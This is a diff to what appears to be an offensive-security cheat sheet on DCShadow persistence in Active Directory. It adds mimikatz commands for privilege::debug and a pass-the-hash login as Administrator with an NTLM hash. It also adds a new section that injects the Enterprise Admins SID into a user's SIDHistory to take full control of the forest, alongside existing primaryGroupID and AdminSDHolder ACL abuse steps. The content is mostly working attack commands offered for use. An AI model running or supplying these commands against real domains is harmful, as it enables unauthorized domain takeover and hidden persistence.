@@ -18,6 +18,8 @@ By default, domain administrative privileges are required to use DCShadow.
 
 To execute this persistence we need to use two isntances of mimikatz. The first one starts RPC servers with SYSTEM privileges and specify attributes to be modified:
 
+* mimikatz.exe
+
 ```powershell
 !+
 !processtoken
@@ -26,6 +28,8 @@ lsadump::dcshadow /object:root1user /attribute:Description /value="Hello from DC
 And the second one with enough privileges, such as DA, will push the values:
 
 ```powershell
+privilege::debug
+sekurlsa::pth /userAdministrator /domain:corp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
 lsadump::dcshadow /push
 ```
 
@@ -42,12 +46,21 @@ lsadump::dcshadow /object:user01 /attribute:primaryGroupID /value:519
 ```
 > **Note**: This makes noise, because every one who looks `net group "Enterpise Admins" /domain` will see that the user user01 is a member.
 
+## Change SIDHistory of a user
+
+We can modify the SIDHistory of a user with SID of `Enterprise Admins` group in order to obtain full control of the forest.
+
+```
+lsadump::dcshadow /object:user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
+```
+
+
 ## Modify ntSecurityDescriptor for AdminSDHolder
 
 We can modify the `ntSecurityDescriptor` for AdminSDHolder to add full control for a user.
 
 ```powershell
-(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminADHolder,CN=System,DC=corp,DC=local")).psbase.ObjectSecurity.sddl
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=corp,DC=local")).psbase.ObjectSecurity.sddl
 ```
 We just need to append a full control ACE from above DA with our users SID.
 
